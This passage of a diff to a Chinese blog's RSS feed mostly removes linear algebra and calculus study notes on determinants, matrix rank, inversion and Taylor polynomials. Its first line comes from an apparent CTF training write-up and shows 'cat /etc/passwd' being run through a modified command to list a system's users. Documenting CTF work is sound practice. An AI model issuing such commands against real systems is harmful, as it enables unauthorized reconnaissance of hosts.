+&lt;p&gt;我们修改命令查看一下有哪些用户：&lt;code&gt;cat /etc/passwd&lt;/code&gt;&lt;/p&gt;
 &lt;!-- 这是一张图片，ocr 内容为： --&gt;
 &lt;p&gt;&lt;img src=&#34;https://www.retr0.xyz/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.6-1/010.png&#34;
 	
@@ -23503,48 +24056,6 @@ echo $b;
 </description>
         </item>
         <item>
-        <title>两种方法判断线性方程组解的情况</title>
-        <link>https://www.retr0.xyz/p/%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95%E5%88%A4%E6%96%AD%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84%E8%A7%A3%E7%9A%84%E6%83%85%E5%86%B5/</link>
-        <pubDate>Fri, 21 Nov 2025 20:45:26 +0800</pubDate>
-        
-        <guid>https://www.retr0.xyz/p/%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95%E5%88%A4%E6%96%AD%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84%E8%A7%A3%E7%9A%84%E6%83%85%E5%86%B5/</guid>
-        <description>&lt;h3 id=&#34;一行列式法仅适用于系数矩阵a为n阶方阵n为变量个数&#34;&gt;一、行列式法（仅适用于系数矩阵$A$为$n$阶方阵，$n$为变量个数）
-&lt;/h3&gt;&lt;h4 id=&#34;1-线性齐次方程组ax0&#34;&gt;1. 线性齐次方程组（$Ax=0$）
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;若 $|A| \neq 0$，方程组 &lt;strong&gt;只有零解&lt;/strong&gt;；&lt;/li&gt;
-&lt;li&gt;若 $|A| = 0$，方程组 &lt;strong&gt;有无穷多非零解&lt;/strong&gt;。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;2-线性非齐次方程组axboverlineaab为增广矩阵&#34;&gt;2. 线性非齐次方程组（$Ax=b$，$\overline{A}=(A,b)$为增广矩阵）
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;若 $|A| \neq 0$，方程组 &lt;strong&gt;有唯一解&lt;/strong&gt;；&lt;/li&gt;
-&lt;li&gt;若 $|A| = 0$：
-&lt;ul&gt;
-&lt;li&gt;当 $r(A) \neq r(\overline{A})$ 时，方程组 &lt;strong&gt;无解&lt;/strong&gt;；&lt;/li&gt;
-&lt;li&gt;当 $r(A) = r(\overline{A})$ 时，方程组 &lt;strong&gt;有无穷多解&lt;/strong&gt;。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;二矩阵的秩法通用无方阵限制&#34;&gt;二、矩阵的秩法（通用，无方阵限制）
-&lt;/h3&gt;&lt;h4 id=&#34;1-核心定义&#34;&gt;1. 核心定义
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;$A$：系数矩阵；&lt;/li&gt;
-&lt;li&gt;$\overline{A}=(A,b)$：线性非齐次方程组的增广矩阵（齐次方程组无需增广矩阵）；&lt;/li&gt;
-&lt;li&gt;$n$：变量个数。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;2-线性齐次方程组ax0&#34;&gt;2. 线性齐次方程组（$Ax=0$）
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;若 $r(A) = n$，方程组 &lt;strong&gt;只有零解&lt;/strong&gt;；&lt;/li&gt;
-&lt;li&gt;若 $r(A) &amp;lt; n$，方程组 &lt;strong&gt;有无穷多非零解&lt;/strong&gt;。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;3-线性非齐次方程组axb&#34;&gt;3. 线性非齐次方程组（$Ax=b$）
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;若 $r(A) \neq r(\overline{A})$，方程组 &lt;strong&gt;无解&lt;/strong&gt;；&lt;/li&gt;
-&lt;li&gt;若 $r(A) = r(\overline{A}) = n$，方程组 &lt;strong&gt;有唯一解&lt;/strong&gt;；&lt;/li&gt;
-&lt;li&gt;若 $r(A) = r(\overline{A}) &amp;lt; n$，方程组 &lt;strong&gt;有无穷多解&lt;/strong&gt;。&lt;/li&gt;
-&lt;/ul&gt;
-</description>
-        </item>
-        <item>
         <title>9.2 模块</title>
         <link>https://www.retr0.xyz/p/9.2-%E6%A8%A1%E5%9D%97/</link>
         <pubDate>Fri, 21 Nov 2025 20:43:18 +0800</pubDate>
@@ -24900,240 +25411,6 @@ echo $b;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;运行后文件内容：&lt;code&gt;苹果,香蕉,橙子&lt;/code&gt;&lt;/p&gt;
-</description>
-        </item>
-        <item>
-        <title>证明矩阵等价</title>
-        <link>https://www.retr0.xyz/p/%E8%AF%81%E6%98%8E%E7%9F%A9%E9%98%B5%E7%AD%89%E4%BB%B7/</link>
-        <pubDate>Fri, 14 Nov 2025 23:41:10 +0800</pubDate>
-        
-        <guid>https://www.retr0.xyz/p/%E8%AF%81%E6%98%8E%E7%9F%A9%E9%98%B5%E7%AD%89%E4%BB%B7/</guid>
-        <description>&lt;h3 id=&#34;证明两个矩阵等价的核心方法简要版&#34;&gt;证明两个矩阵等价的核心方法（简要版）
-&lt;/h3&gt;&lt;p&gt;矩阵等价的核心定义：设$A$、$B$为$m \times n$同型矩阵，若存在$m$阶可逆矩阵$P$和$n$阶可逆矩阵$Q$，使得$PAQ = B$，则$A$与$B$等价。&lt;/p&gt;
-&lt;h4 id=&#34;关键充要条件满足其一即可证明&#34;&gt;关键充要条件（满足其一即可证明）
-&lt;/h4&gt;&lt;ol&gt;
-&lt;li&gt;&lt;strong&gt;秩相等&lt;/strong&gt;：$r(A) = r(B)$（最常用，无需构造可逆矩阵，计算秩即可）；&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;初等变换互化&lt;/strong&gt;：$A$可通过有限次初等行/列变换化为$B$；&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;等价标准形相同&lt;/strong&gt;：$A$和$B$的等价标准形均为$\begin{pmatrix} I_r &amp;amp; O \ O &amp;amp; O \end{pmatrix}$（$r$为秩，$I_r$为$r$阶单位矩阵）。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h4 id=&#34;简要证明思路&#34;&gt;简要证明思路
-&lt;/h4&gt;&lt;ol&gt;
-&lt;li&gt;先验证$A$与$B$是&lt;strong&gt;同型矩阵&lt;/strong&gt;（行数、列数一致，否则必不等价）；&lt;/li&gt;
-&lt;li&gt;任选上述充要条件验证：
-&lt;ul&gt;
-&lt;li&gt;便捷法：计算$r(A)$和$r(B)$，若相等则等价；&lt;/li&gt;
-&lt;li&gt;严谨法：通过初等变换将$A$化为$B$，或构造$P$、$Q$使$PAQ = B$。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-</description>
-        </item>
-        <item>
-        <title>算行列式的几种方法</title>
-        <link>https://www.retr0.xyz/p/%E7%AE%97%E8%A1%8C%E5%88%97%E5%BC%8F%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</link>
-        <pubDate>Fri, 14 Nov 2025 23:40:45 +0800</pubDate>
-        
-        <guid>https://www.retr0.xyz/p/%E7%AE%97%E8%A1%8C%E5%88%97%E5%BC%8F%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</guid>
-        <description>&lt;h3 id=&#34;一行列式的核心计算方法及适用情况&#34;&gt;一、行列式的核心计算方法及适用情况
-&lt;/h3&gt;&lt;h4 id=&#34;1-定义法&#34;&gt;1. 定义法
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;核心思路&lt;/strong&gt;：直接利用n阶行列式的定义（所有$n!$项的代数和），即：&lt;br&gt;
-
-$$|A| = \sum_{p_1p_2\cdots p_n} (-1)^{\tau(p_1p_2\cdots p_n)} a_{1p_1}a_{2p_2}\cdots a_{np_n}$$&lt;br&gt;
-其中$\tau$是排列$p_1p_2\cdots p_n$的逆序数。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;适用情况&lt;/strong&gt;：
-&lt;ul&gt;
-&lt;li&gt;1阶、2阶行列式（直接计算，无需简化）；&lt;/li&gt;
-&lt;li&gt;高阶行列式但&lt;strong&gt;零元素极多&lt;/strong&gt;（非零项仅1-2项，可快速筛选）。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;优点&lt;/strong&gt;：直观、无需额外技巧；&lt;strong&gt;缺点&lt;/strong&gt;：高阶（≥3阶）非零项多，计算量爆炸。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;2-按行列展开法降阶法&#34;&gt;2. 按行（列）展开法（降阶法）
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;原理&lt;/strong&gt;：行列式等于它的任意一行(列)各元素与其对应的代数余子式乘积之和，即
-
-$$D=a_{i1}A_{i1}+a_{i2}A_{i3}+ \cdots +a_{in}A_{in}   
-(i=1,2, \cdots ,n) $$&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;核心思路&lt;/strong&gt;：利用行列式展开定理，将n阶行列式按某行（列）展开为n个n-1阶行列式的线性组合：&lt;br&gt;
-
-$$|A| = \sum_{j=1}^n a_{ij}A_{ij} \quad (\text{按第}i\text{行展开})$$&lt;br&gt;
-其中$A_{ij}=(-1)^{i+j}M_{ij}$（$M_{ij}$为余子式）。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;适用情况&lt;/strong&gt;：
-&lt;ul&gt;
-&lt;li&gt;某行（列）&lt;strong&gt;零元素≥n-2个&lt;/strong&gt;（直接展开后计算量小）；&lt;/li&gt;
-&lt;li&gt;可通过初等变换（如某行加另一行的$k$倍）快速造出一行（列）多零元素。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;关键技巧&lt;/strong&gt;：优先选择零元素最多的行（列）展开，减少计算量。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;3-初等变换法化三角法&#34;&gt;3. 初等变换法（化三角法）
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;核心思路&lt;/strong&gt;：利用行列式的初等变换性质，将行列式化为&lt;strong&gt;上三角行列式&lt;/strong&gt;（主对角线下方全为0）或&lt;strong&gt;下三角行列式&lt;/strong&gt;（主对角线上方全为0），三角行列式的值=主对角线元素乘积：&lt;br&gt;
-
-$$\begin{vmatrix} a_{11} &amp; a_{12} &amp; \cdots &amp; a_{1n} \\ 0 &amp; a_{22} &amp; \cdots &amp; a_{2n} \\ \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\ 0 &amp; 0 &amp; \cdots &amp; a_{nn} \end{vmatrix} = a_{11}a_{22}\cdots a_{nn}$$&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;适用情况&lt;/strong&gt;：
-&lt;ul&gt;
-&lt;li&gt;任意n阶行列式（3阶及以上最常用）；&lt;/li&gt;
-&lt;li&gt;元素无明显规律、零元素少的普通行列式。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;常用变换&lt;/strong&gt;：换行变号、某行乘非零常数、某行加另一行的$k$倍（不改变行列式值）。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;4-递推法&#34;&gt;4. 递推法
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;核心思路&lt;/strong&gt;：通过展开或变换，建立n阶行列式$D_n$与低阶行列式（$D_{n-1}$、$D_{n-2}$）的递推关系（如$D_n = pD_{n-1} + qD_{n-2}$），求解递推公式得结果。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;适用情况&lt;/strong&gt;：
-&lt;ul&gt;
-&lt;li&gt;具有&lt;strong&gt;带状结构&lt;/strong&gt;的行列式（如三对角行列式）；&lt;/li&gt;
-&lt;li&gt;结构对称、元素按规律重复的行列式（如$n$阶循环行列式）。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：三对角行列式（主对角线及相邻两条对角线非零，其余为0）：&lt;br&gt;
-
-$$D_n = \begin{vmatrix} a &amp; b &amp; &amp; \\ c &amp; a &amp; b &amp; \\ &amp; c &amp; a &amp; \ddots \\ &amp; &amp; \ddots &amp; \ddots &amp; b \\ &amp; &amp; &amp; c &amp; a \end{vmatrix}$$&lt;br&gt;
-展开后得递推关系$D_n = aD_{n-1} - bcD_{n-2}$，结合初始条件$D_1=a$、$D_2=a^2-bc$求解。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;5-数学归纳法&#34;&gt;5. 数学归纳法
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;核心思路&lt;/strong&gt;：先验证$n=1$（或$n=2$）时行列式等式成立，假设$n=k$时成立，证明$n=k+1$时也成立，从而推广到所有$n$。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;适用情况&lt;/strong&gt;：
-&lt;ul&gt;
-&lt;li&gt;已知行列式结果（需证明）；&lt;/li&gt;
-&lt;li&gt;结构具有明显递推规律的行列式（如范德蒙德行列式、高阶对称行列式）。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;二特殊结构行列式的专门解法及适用情况&#34;&gt;二、特殊结构行列式的专门解法及适用情况
-&lt;/h3&gt;&lt;h4 id=&#34;1-三角对角行列式含数量矩阵&#34;&gt;1. 三角/对角行列式（含数量矩阵）
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;结构特征&lt;/strong&gt;：
-&lt;ul&gt;
-&lt;li&gt;上三角：主对角线下方全为0；下三角：主对角线上方全为0；&lt;/li&gt;
-&lt;li&gt;对角行列式：仅主对角线非零（三角行列式的特例）。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;适用情况&lt;/strong&gt;：直接符合上述结构，或可通过1-2步初等变换化为该结构。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;解法&lt;/strong&gt;：直接取主对角线元素的乘积，即$|A| = \prod_{i=1}^n a_{ii}$。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;2-范德蒙德行列式vandermonde-determinant&#34;&gt;2. 范德蒙德行列式（Vandermonde Determinant）
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;结构特征&lt;/strong&gt;：第$i$行（或列）为变量$x_1,x_2,\cdots,x_n$的0到$n-1$次幂，形式如下：&lt;br&gt;
-
-$$V_n = \begin{vmatrix} 1 &amp; 1 &amp; \cdots &amp; 1 \\ x_1 &amp; x_2 &amp; \cdots &amp; x_n \\ x_1^2 &amp; x_2^2 &amp; \cdots &amp; x_n^2 \\ \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\ x_1^{n-1} &amp; x_2^{n-1} &amp; \cdots &amp; x_n^{n-1} \end{vmatrix}$$&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;适用情况&lt;/strong&gt;：完全符合上述结构，或可通过转置、换行（列）调整为该结构（注意换行变号）。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;解法&lt;/strong&gt;：直接套用公式（所有变量两两差的乘积）：&lt;br&gt;
-
-$$V_n = \prod_{1 \leq j &lt; i \leq n} (x_i - x_j)$$&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;关键提醒&lt;/strong&gt;：若行列式是“列为幂次”，转置后仍为范德蒙德行列式（$|V_n^T|=|V_n|$）。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;3-爪型行列式星形行列式&#34;&gt;3. 爪型行列式（星形行列式）
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;结构特征&lt;/strong&gt;：主对角线有非零元素，仅第一行、第一列（或最后一行、最后一列）有非零元素，其余为0，形如“爪”：&lt;br&gt;
-
-$$D_n = \begin{vmatrix} a_0 &amp; b_1 &amp; b_2 &amp; \cdots &amp; b_n \\ c_1 &amp; a_1 &amp; 0 &amp; \cdots &amp; 0 \\ c_2 &amp; 0 &amp; a_2 &amp; \cdots &amp; 0 \\ \vdots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\ c_n &amp; 0 &amp; 0 &amp; \cdots &amp; a_n \end{vmatrix} \quad (a_i \neq 0)$$&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;适用情况&lt;/strong&gt;：严格符合“主对角线+第一行+第一列”的爪形结构（无其他非零元素）。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;解法&lt;/strong&gt;：消去第一列（或第一行）的非零元素，化为对角行列式：&lt;br&gt;
-第$i$行（$i\geq2$）减去$\frac{c_i}{a_i} \times$第1行，得：&lt;br&gt;
-
-$$D_n = \begin{vmatrix} a_0 - \sum_{i=1}^n \frac{b_i c_i}{a_i} &amp; b_1 &amp; b_2 &amp; \cdots &amp; b_n \\ 0 &amp; a_1 &amp; 0 &amp; \cdots &amp; 0 \\ 0 &amp; 0 &amp; a_2 &amp; \cdots &amp; 0 \\ \vdots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\ 0 &amp; 0 &amp; 0 &amp; \cdots &amp; a_n \end{vmatrix} = \left( a_0 - \sum_{i=1}^n \frac{b_i c_i}{a_i} \right) \prod_{i=1}^n a_i$$&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;4-箭型行列式特殊爪型&#34;&gt;4. 箭型行列式（特殊爪型）
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;结构特征&lt;/strong&gt;：仅第一行、最后一行、第一列、最后一列有非零元素，其余为0，形如“箭”：&lt;br&gt;
-
-$$D_n = \begin{vmatrix} a &amp; b &amp; &amp; &amp; c \\ d &amp; a_2 &amp; &amp; &amp; \\ &amp; &amp; a_3 &amp; &amp; \\ &amp; &amp; &amp; \ddots &amp; \\ e &amp; &amp; &amp; &amp; a_n \end{vmatrix} \quad (a_i \neq 0)$$&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;适用情况&lt;/strong&gt;：符合“四边非零、中间全零”的箭形结构。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;解法&lt;/strong&gt;：用第一列或最后一列的非零元素消去第一行、最后一行的非零元素，化为三角行列式。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;5-分块行列式&#34;&gt;5. 分块行列式
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;结构特征&lt;/strong&gt;：矩阵可分块为对角块、上三角块或下三角块，例如：
-&lt;ul&gt;
-&lt;li&gt;分块对角：$A = \begin{pmatrix} A_1 &amp;amp; O \ O &amp;amp; A_2 \end{pmatrix}$（$O$为零矩阵）；&lt;/li&gt;
-&lt;li&gt;分块上三角：$A = \begin{pmatrix} A_1 &amp;amp; B \ O &amp;amp; A_2 \end{pmatrix}$。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;适用情况&lt;/strong&gt;：分块后非对角块为零矩阵（或可通过变换化为零块）。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;解法&lt;/strong&gt;：套用分块行列式公式：
-&lt;ul&gt;
-&lt;li&gt;分块对角：$|A| = |A_1| \cdot |A_2| \cdots |A_k|$；&lt;/li&gt;
-&lt;li&gt;分块上/下三角：$|A| = |A_1| \cdot |A_2| \cdots |A_k|$（仅需对角块非奇异）。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;6-hessenberg行列式&#34;&gt;6. Hessenberg行列式
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;结构特征&lt;/strong&gt;：上Hessenberg（主对角线下方仅一条非零元素带）或下Hessenberg（主对角线上方仅一条非零元素带）：&lt;br&gt;
-
-$$D_n = \begin{vmatrix} a_{11} &amp; a_{12} &amp; \cdots &amp; a_{1n} \\ a_{21} &amp; a_{22} &amp; \cdots &amp; a_{2n} \\ &amp; a_{32} &amp; \cdots &amp; a_{3n} \\ &amp; &amp; \ddots &amp; \vdots \\ &amp; &amp; &amp; a_{nn} \end{vmatrix}$$&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;适用情况&lt;/strong&gt;：带状结构、非零元素集中在主对角线附近。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;解法&lt;/strong&gt;：按第一列（或最后一列）展开，建立递推关系求解。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;三方法选择优先级总结&#34;&gt;三、方法选择优先级总结
-&lt;/h3&gt;&lt;ol&gt;
-&lt;li&gt;先判断是否为&lt;strong&gt;特殊结构&lt;/strong&gt;（范德蒙德、爪型、三角等）→ 直接套用专门公式；&lt;/li&gt;
-&lt;li&gt;若为普通行列式，先看是否有&lt;strong&gt;多零元素行（列）&lt;/strong&gt; → 按行（列）展开降阶；&lt;/li&gt;
-&lt;li&gt;无明显零元素→ 用&lt;strong&gt;初等变换法化三角&lt;/strong&gt;（3阶及以上首选）；&lt;/li&gt;
-&lt;li&gt;结构对称/带状→ 用&lt;strong&gt;递推法&lt;/strong&gt;；需证明结果→ 用&lt;strong&gt;数学归纳法&lt;/strong&gt;。&lt;/li&gt;
-&lt;/ol&gt;
-</description>
-        </item>
-        <item>
-        <title>几种多项式及余项</title>
-        <link>https://www.retr0.xyz/p/%E5%87%A0%E7%A7%8D%E5%A4%9A%E9%A1%B9%E5%BC%8F%E5%8F%8A%E4%BD%99%E9%A1%B9/</link>
-        <pubDate>Fri, 14 Nov 2025 23:40:16 +0800</pubDate>
-        
-        <guid>https://www.retr0.xyz/p/%E5%87%A0%E7%A7%8D%E5%A4%9A%E9%A1%B9%E5%BC%8F%E5%8F%8A%E4%BD%99%E9%A1%B9/</guid>
-        <description>&lt;blockquote&gt;
-&lt;p&gt;多项式+余项=公式&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3 id=&#34;一泰勒多项式taylor-polynomial&#34;&gt;一、泰勒多项式（Taylor Polynomial）
-&lt;/h3&gt;&lt;h4 id=&#34;定义&#34;&gt;定义
-&lt;/h4&gt;&lt;p&gt;设函数$ f(x) $在点$ x = a $处$ n $阶可导，则以$ x = a $为中心的$ n $次泰勒多项式为：
-&lt;/p&gt;
-$$
-P_n(x) = f(a) + f&#39;(a)(x - a) + \frac{f&#39;&#39;(a)}{2!}(x - a)^2 + \cdots + \frac{f^{(n)}(a)}{n!}(x - a)^n
-$$&lt;h4 id=&#34;核心特点&#34;&gt;核心特点
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;本质：用$ f(x) $在$ x = a $处的函数值及各阶导数值，构造多项式逼近$ f(x) $；&lt;/li&gt;
-&lt;li&gt;局部性：在$ a $的邻域内逼近效果好，阶数$ n $越高，逼近越精确。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;二麦克劳林多项式maclaurin-polynomial&#34;&gt;二、麦克劳林多项式（Maclaurin Polynomial）
-&lt;/h3&gt;&lt;h4 id=&#34;定义-1&#34;&gt;定义
-&lt;/h4&gt;&lt;p&gt;泰勒多项式的特殊情况——当中心$ a = 0 $时，$ n $次麦克劳林多项式为：
-&lt;/p&gt;
-$$
-P_n(x) = f(0) + f&#39;(0)x + \frac{f&#39;&#39;(0)}{2!}x^2 + \cdots + \frac{f^{(n)}(0)}{n!}x^n
-$$&lt;h4 id=&#34;核心特点-1&#34;&gt;核心特点
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;简化形式：无需考虑$ (x - a) $项，直接以$ x $的幂次展开；&lt;/li&gt;
-&lt;li&gt;适用场景：$ f(x) $在$ x = 0 $处易求各阶导数（如$ e^x $、$ \sin x $、$ \cos x $等）。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;三拉格朗日余项lagrange-remainder&#34;&gt;三、拉格朗日余项（Lagrange Remainder）
-&lt;/h3&gt;&lt;h4 id=&#34;定义-2&#34;&gt;定义
-&lt;/h4&gt;&lt;p&gt;泰勒公式中，$ f(x) $与泰勒多项式$ P_n(x) $的误差（定量余项），表达式为：
-&lt;/p&gt;
-$$
-R_n(x) = \frac{f^{(n+1)}(\xi)}{(n+1)!}(x - a)^{n+1}
-$$&lt;p&gt;
-其中$ \xi $是介于$ a $与$ x $之间的某个数。&lt;/p&gt;
-&lt;h4 id=&#34;核心特点-2&#34;&gt;核心特点
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;定量误差：给出误差的具体表达式，可精确估计逼近精度；&lt;/li&gt;
-&lt;li&gt;条件：要求$ f(x) $在$ a $的邻域内$ n+1 $阶可导。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;四佩亚诺余项peano-remainder&#34;&gt;四、佩亚诺余项（Peano Remainder）
-&lt;/h3&gt;&lt;h4 id=&#34;定义-3&#34;&gt;定义
-&lt;/h4&gt;&lt;p&gt;泰勒公式中，误差的定性描述（高阶无穷小余项），表达式为：
-&lt;/p&gt;
-$$
-R_n(x) = o\left((x - a)^n\right) \quad (x \to a)
-$$&lt;h4 id=&#34;核心特点-3&#34;&gt;核心特点
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;定性误差：仅说明“当$ x \to a $时，误差是$ (x - a)^n $的高阶无穷小”，不给出具体大小；&lt;/li&gt;
-&lt;li&gt;条件：仅需$ f(x) $在$ x = a $处$ n $阶可导，要求比拉格朗日余项低。&lt;/li&gt;
-&lt;/ul&gt;
 </description>
         </item>
         <item>
@@ -27321,153 +27598,6 @@ SHA256：24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c&lt;/p&
 &lt;/div&gt;</description>
         </item>
         <item>
-        <title>几种方法求逆矩阵</title>
-        <link>https://www.retr0.xyz/p/%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%E6%B1%82%E9%80%86%E7%9F%A9%E9%98%B5/</link>
-        <pubDate>Sun, 02 Nov 2025 21:54:18 +0800</pubDate>
-        
-        <guid>https://www.retr0.xyz/p/%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%E6%B1%82%E9%80%86%E7%9F%A9%E9%98%B5/</guid>
-        <description>&lt;h3 id=&#34;一伴随矩阵与伴随矩阵法求逆矩阵&#34;&gt;一、伴随矩阵与伴随矩阵法求逆矩阵
-&lt;/h3&gt;&lt;h4 id=&#34;1-伴随矩阵的定义&#34;&gt;1. 伴随矩阵的定义
-&lt;/h4&gt;&lt;p&gt;对于n阶方阵$A = (a_{ij})$，其&lt;strong&gt;代数余子式&lt;/strong&gt;$A_{ij}$定义为：$A_{ij} = (-1)^{i+j}M_{ij}$，其中$M_{ij}$是$A$中去掉第$i$行第$j$列后剩余子矩阵的行列式（即余子式）。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;伴随矩阵&lt;/strong&gt;$A^*$是由$A$的代数余子式按&lt;strong&gt;转置顺序&lt;/strong&gt;排列而成的矩阵，即：
-&lt;/p&gt;
-$$
-A^* = \begin{pmatrix} A_{11} &amp; A_{21} &amp; \cdots &amp; A_{n1} \\ A_{12} &amp; A_{22} &amp; \cdots &amp; A_{n2} \\ \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\ A_{1n} &amp; A_{2n} &amp; \cdots &amp; A_{nn} \end{pmatrix}
-$$&lt;h4 id=&#34;2-伴随矩阵的核心性质&#34;&gt;2. 伴随矩阵的核心性质
-&lt;/h4&gt;&lt;p&gt;对于任意n阶方阵$A$，有：
-&lt;/p&gt;
-$$
-A \cdot A^* = A^* \cdot A = |A|I_n
-$$&lt;p&gt;
-其中$|A|$是$A$的行列式，$I_n$是n阶单位矩阵。&lt;/p&gt;
-&lt;h4 id=&#34;3-伴随矩阵法求逆矩阵&#34;&gt;3. 伴随矩阵法求逆矩阵
-&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;可逆条件&lt;/strong&gt;：矩阵$A$可逆的充要条件是$|A| \neq 0$。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;逆矩阵公式&lt;/strong&gt;：若$|A| \neq 0$，则$A$的逆矩阵为：
-&lt;/p&gt;
-$$
-A^{-1} = \frac{1}{|A|}A^*
-$$&lt;p&gt;&lt;strong&gt;推导过程&lt;/strong&gt;：由$A \cdot A^* = |A|I_n$，两边同时除以$|A|$（因$|A| \neq 0$），得：
-&lt;/p&gt;
-$$
-A \cdot \frac{1}{|A|}A^* = I_n
-$$&lt;p&gt;
-根据逆矩阵的定义，可知$\frac{1}{|A|}A^&lt;em&gt;$是$A$的逆矩阵，即$A^{-1} = \frac{1}{|A|}A^&lt;/em&gt;$。&lt;/p&gt;
-&lt;h4 id=&#34;4-示例用伴随矩阵法求2阶矩阵的逆&#34;&gt;4. 示例：用伴随矩阵法求2阶矩阵的逆
-&lt;/h4&gt;&lt;p&gt;设$A = \begin{pmatrix} 1 &amp;amp; 2 \ 3 &amp;amp; 4 \end{pmatrix}$，求$A^{-1}$。&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;步骤1：计算行列式$|A|$
-&lt;/p&gt;
-$$
-  |A| = 1 \times 4 - 2 \times 3 = 4 - 6 = -2 \neq 0
-  $$&lt;p&gt;
